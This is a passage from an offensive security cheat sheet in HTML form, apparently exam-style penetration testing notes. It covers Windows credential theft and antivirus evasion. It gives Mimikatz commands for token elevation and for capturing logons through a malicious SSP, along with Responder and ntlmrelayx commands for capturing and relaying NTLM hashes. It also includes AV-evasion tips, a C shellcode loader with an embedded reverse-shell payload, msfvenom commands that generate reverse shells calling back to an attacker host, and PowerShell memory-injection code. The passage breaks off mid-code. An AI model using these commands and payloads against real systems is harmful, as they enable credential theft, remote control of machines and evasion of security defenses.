</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;privilege::debug token::elevate&#39;</span>
</span></code></pre></div>
<p><strong><em>Capture Net-NTLMv2</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Responder<span class="w"> </span>-I<span class="w"> </span><span class="o">[</span>interface<span class="o">]</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>PS<span class="w"> </span>&gt;<span class="w"> </span>ls<span class="w"> </span><span class="se">\\</span><span class="o">[</span>IP<span class="o">]</span><span class="se">\s</span>hare
</span></code></pre></div>
<p><strong><em>Relaying Net-NTLMv2</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;CMD&quot;</span>
</span></code></pre></div>
<h4 id="windows-credential-guard"><strong><em>Windows Credential Guard</em></strong></h4>
<aside>


Credential Guard Mitigation restrict access to ***LSASS.exe*** process. Domain/Remote user hashes arent accessible while the Local users are.

</aside>

<aside>


Microsoft provides quite a few [*authentication mechanisms](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))* as part of the Windows operating system such as *Local Security Authority (LSA) Authentication*, *Winlogon*, *Security Support Provider Interfaces (SSPI)*, etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.

By default, Windows provides several *Security Support Providers (SSP)* such as *Kerberos Security Support Provider*, *NTLM Security Support Provider*, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

Additionally the SSP can also be registered through the *HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages* registry key. Each time the system starts up, the *Local Security Authority* (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with *LSASS*, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

</aside>

<p><strong><em>Abuse SSP Authentication to Bypass Device Protection Mitigation</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="n">misc</span><span class="p">::</span><span class="n">memssp</span>
</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="c">## At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.</span>
</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>
</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="c">## Check the Dump Credentials</span>
</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">mimilsa</span><span class="p">.</span><span class="n">log</span>
</span></code></pre></div>
<hr />
<h2 id="antivirus-evasion"><strong>Antivirus Evasion</strong></h2>
<p><strong><em>AV Engines:</em></strong></p>
<ul>
<li>File Engine</li>
<li>Memory Engine</li>
<li>Network Engine</li>
<li>Disassembler</li>
<li>Emulator/Sandbox</li>
<li>Browser Plugin</li>
<li>Machine Learning Engine</li>
</ul>
<p><strong><em>Detection Methods</em></strong></p>
<ul>
<li>Signature-based Detection</li>
<li>Heuristic-based Detection</li>
<li>Behavioral Detection</li>
<li>Machine Learning Detection</li>
</ul>
<h3 id="bypassing-antivirus-detections"><strong>Bypassing Antivirus Detections</strong></h3>
<h4 id="on-disk-evasion"><strong>On-Disk Evasion</strong></h4>
<blockquote>
<p>Modern on-disk malware obfuscation can take many forms. One of the earliest ways of avoiding detection involved the use of <a href="https://en.wikipedia.org/wiki/Executable_compression"><em>packers</em></a>. Given the high cost of disk space and slow network speeds during the early days of the internet, packers were originally designed to reduce the size of an executable. Unlike modern "zip" compression techniques, packers generate an executable that is not only smaller but is also functionally equivalent with a completely new binary structure. The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners. Even though
some modern malware uses a variation of this technique, the use of <a href="https://upx.github.io/"><em>UPX</em></a> and other popular packers alone is not sufficient to evade modern AV scanners.
</p>
<p><em>Obfuscators</em> reorganize and mutate code in a way that makes it more difficult to reverse-engineer. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions or <a href="https://en.wikipedia.org/wiki/Dead_code"><em>dead code</em></a>, splitting or reordering functions, and so on. Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection. Modern obfuscators also have runtime in-memory capabilities, which aims to hinder AV detection even further.
</p>
<p><em>Crypter</em> software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution. This decryption happens in-memory, leaving only the encrypted code on-disk. Encryption has become foundational in modern malware as one of the most effective AV evasion techniques.
</p>
<p>Highly effective antivirus evasion requires a combination of all the previous techniques in addition to other advanced ones, including <em>anti-reversing</em>, <em>anti-debugging</em>, <em>virtual machine emulation detection</em>, and so on. In most cases, <em>software protectors</em> were designed for legitimate purposes, like <em>anti-copy</em>, but can also be used to bypass AV detection.
</p>
<p>Most of these techniques may appear simple at a high-level but they can be quite complex. Because of this, there are currently few actively maintained free tools that provide acceptable antivirus evasion. Among commercially available tools, <a href="http://www.enigmaprotector.com/en/home.html"><em>The Enigma Protector</em></a> can be used to successfully bypass antivirus products.
</p>
</blockquote>
<h4 id="in-memory-evasion"><strong>In-Memory Evasion</strong></h4>
<blockquote>
<p>The first technique we are going to cover is <em>Remote Process Memory Injection</em>, which attempts to inject the payload into another valid PE that is not malicious. The most common method of doing this is by leveraging a set of <a href="https://en.wikipedia.org/wiki/Windows_API"><em>Windows APIs</em></a>. First, we would use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess">*OpenProcess</a><em> function to obtain a valid <a href="https://en.wikipedia.org/wiki/Handle_(computing)">*HANDLE</a></em> to a target process that we have permission to access. After obtaining the HANDLE, we would allocate memory in the context of that process by calling a Windows API such as <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex"><em>VirtualAllocEx</em></a>. Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory"><em>WriteProcessMemory</em></a>. After the payload has been successfully copied, it is usually executed in memory in a separate thread using the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread">*CreateRemoteThread</a>* API.
</p>
<p>Unlike regular <em>DLL injection</em>, which involves loading a malicious DLL from disk using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">*LoadLibrary</a><em> API, the <a href="https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/">*Reflective DLL Injection</a></em> technique attempts to load a DLL stored by the attacker in the process memory.</p>
<p>The main challenge of implementing this technique is that <em>LoadLibrary</em> does not support loading a DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write
their own version of the API that does not rely on a disk-based DLL.
</p>
<p>The third technique we want to mention is <a href="https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations"><em>Process Hollowing</em></a>. When using process hollowing to bypass antivirus software, attackers first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed, and malicious code is executed instead of the legitimate process.
</p>
<p>Ultimately, <em>Inline hooking</em>, as the name suggests, involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return to the modified function and resume execution, appearing as if only the original code had executed.
</p>
</blockquote>
<h3 id="av-evasion-in-practice"><strong>AV Evasion in Practice</strong></h3>
<h4 id="testing-for-av-evasion"><strong>Testing for AV Evasion</strong></h4>
<p><strong><em>Disable Sample Submission</em></strong></p>
<p><em>Windows Security</em> &gt;  <em>Virus &amp; threat protection</em> &gt; <em>Manage Settings</em> and deselecting</p>
<p><strong><em>Scanning without share to third-parties</em></strong></p>
<p><a href="https://kleenscan.com/index">Kleenscan.com</a></p>
<h4 id="ad-evasion-custom-binaries">AD Evasion - Custom Binaries</h4>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;windows.h&quot;</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="p">{</span>
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff</span><span class="s">&quot;</span>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58</span><span class="s">&quot;</span>
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78</span><span class="s">&quot;</span>
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e</span><span class="s">&quot;</span>
</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09</span><span class="s">&quot;</span>
</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3</span><span class="s">&quot;</span>
</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff</span><span class="s">&quot;</span>
</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d</span><span class="s">&quot;</span>
</span><span id="__span-59-14"><a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8</span><span class="s">&quot;</span>
</span><span id="__span-59-15"><a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69</span><span class="s">&quot;</span>
</span><span id="__span-59-16"><a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1</span><span class="s">&quot;</span>
</span><span id="__span-59-17"><a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e</span><span class="s">&quot;</span>
</span><span id="__span-59-18"><a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f</span><span class="s">&quot;</span>
</span><span id="__span-59-19"><a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa</span><span class="s">&quot;</span>
</span><span id="__span-59-20"><a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e</span><span class="s">&quot;</span>
</span><span id="__span-59-21"><a id="__codelineno-59-21" name="__codelineno-59-21" href="#__codelineno-59-21"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2</span><span class="s">&quot;</span>
</span><span id="__span-59-22"><a id="__codelineno-59-22" name="__codelineno-59-22" href="#__codelineno-59-22"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5</span><span class="s">&quot;</span>
</span><span id="__span-59-23"><a id="__codelineno-59-23" name="__codelineno-59-23" href="#__codelineno-59-23"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3</span><span class="s">&quot;</span>
</span><span id="__span-59-24"><a id="__codelineno-59-24" name="__codelineno-59-24" href="#__codelineno-59-24"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61</span><span class="s">&quot;</span>
</span><span id="__span-59-25"><a id="__codelineno-59-25" name="__codelineno-59-25" href="#__codelineno-59-25"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b</span><span class="s">&quot;</span>
</span><span id="__span-59-26"><a id="__codelineno-59-26" name="__codelineno-59-26" href="#__codelineno-59-26"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2</span><span class="s">&quot;</span>
</span><span id="__span-59-27"><a id="__codelineno-59-27" name="__codelineno-59-27" href="#__codelineno-59-27"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63</span><span class="s">&quot;</span>
</span><span id="__span-59-28"><a id="__codelineno-59-28" name="__codelineno-59-28" href="#__codelineno-59-28"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6</span><span class="s">&quot;</span>
</span><span id="__span-59-29"><a id="__codelineno-59-29" name="__codelineno-59-29" href="#__codelineno-59-29"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55</span><span class="s">&quot;</span>
</span><span id="__span-59-30"><a id="__codelineno-59-30" name="__codelineno-59-30" href="#__codelineno-59-30"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec</span><span class="s">&quot;</span>
</span><span id="__span-59-31"><a id="__codelineno-59-31" name="__codelineno-59-31" href="#__codelineno-59-31"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b</span><span class="s">&quot;</span>
</span><span id="__span-59-32"><a id="__codelineno-59-32" name="__codelineno-59-32" href="#__codelineno-59-32"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d</span><span class="s">&quot;</span>
</span><span id="__span-59-33"><a id="__codelineno-59-33" name="__codelineno-59-33" href="#__codelineno-59-33"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b</span><span class="s">&quot;</span>
</span><span id="__span-59-34"><a id="__codelineno-59-34" name="__codelineno-59-34" href="#__codelineno-59-34"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2</span><span class="s">&quot;</span>
</span><span id="__span-59-35"><a id="__codelineno-59-35" name="__codelineno-59-35" href="#__codelineno-59-35"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68</span><span class="s">&quot;</span>
</span><span id="__span-59-36"><a id="__codelineno-59-36" name="__codelineno-59-36" href="#__codelineno-59-36"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8</span><span class="s">&quot;</span>
</span><span id="__span-59-37"><a id="__codelineno-59-37" name="__codelineno-59-37" href="#__codelineno-59-37"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61</span><span class="s">&quot;</span>
</span><span id="__span-59-38"><a id="__codelineno-59-38" name="__codelineno-59-38" href="#__codelineno-59-38"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad</span><span class="s">&quot;</span>
</span><span id="__span-59-39"><a id="__codelineno-59-39" name="__codelineno-59-39" href="#__codelineno-59-39"></a><span class="w">        </span><span class="s">&quot;</span><span class="se">\x94\x64\x5d\xae\x2b\x90\xe1\xec</span><span class="s">&quot;</span><span class="p">;</span>
</span><span id="__span-59-40"><a id="__codelineno-59-40" name="__codelineno-59-40" href="#__codelineno-59-40"></a>
</span><span id="__span-59-41"><a id="__codelineno-59-41" name="__codelineno-59-41" href="#__codelineno-59-41"></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</span><span id="__span-59-42"><a id="__codelineno-59-42" name="__codelineno-59-42" href="#__codelineno-59-42"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="n">shellcode</span><span class="p">);</span>
</span><span id="__span-59-43"><a id="__codelineno-59-43" name="__codelineno-59-43" href="#__codelineno-59-43"></a><span class="w">    </span><span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
</span><span id="__span-59-44"><a id="__codelineno-59-44" name="__codelineno-59-44" href="#__codelineno-59-44"></a>
</span><span id="__span-59-45"><a id="__codelineno-59-45" name="__codelineno-59-45" href="#__codelineno-59-45"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-59-46"><a id="__codelineno-59-46" name="__codelineno-59-46" href="#__codelineno-59-46"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Generate Shellcode</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1">## 32bit</span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.5<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-b<span class="w"> </span><span class="s1">&#39;\x00&#39;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="c1">## 64bit</span>
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.5<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-b<span class="w"> </span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>0a<span class="se">\x</span>0d
</span></code></pre></div>
<p><strong><em>Generate 32 /64 bit Executables</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>i686-w64-mingw32-gcc<span class="w"> </span>exploit.cpp<span class="w"> </span>-o<span class="w"> </span>output.exe
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>exploit.cpp<span class="w"> </span>-o<span class="w"> </span>output.exe
</span></code></pre></div>
<h4 id="ad-evasion-memory-injection"><strong>AD Evasion - Memory Injection</strong></h4>
<p><strong><em>Basic Memory Injection Code</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="nv">$code</span> <span class="p">=</span> <span class="s1">&#39;</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="s1">[DllImport(&quot;kernel32.dll&quot;)]</span>
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="s1">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="s1">[DllImport(&quot;kernel32.dll&quot;)]</span>
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a><span class="s1">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span>
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a><span class="s1">[DllImport(&quot;msvcrt.dll&quot;)]</span>
</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a><span class="s1">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;</span><span class="p">;</span>
</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>
</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a><span class="p">&lt;</span><span class="n">place</span> <span class="n">shellcode</span> <span class="n">here</span><span class="p">&gt;</span>
</span></code></pre></div>
<p><strong><em>Generate PowerShell Memory Injection Payload</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=[</span>PORT<span class="o">]</span><span class="w"> </span>-f<span class="w"> </span>psh-reflection
</span></code></pre></div>
<p><strong><em>Full Basic Memory Injection Code</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nv">$code</span> <span class="p">=</span> <span class="s1">&#39;</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="s1">[DllImport(&quot;kernel32.dll&quot;)]</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="s1">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="s1">[DllImport(&quot;kernel32.dll&quot;)]</span>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="s1">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span>
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a><span class="s1">[DllImport(&quot;msvcrt.dll&quot;)]</span>
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="s1">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;</span><span class="p">;</span>
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>
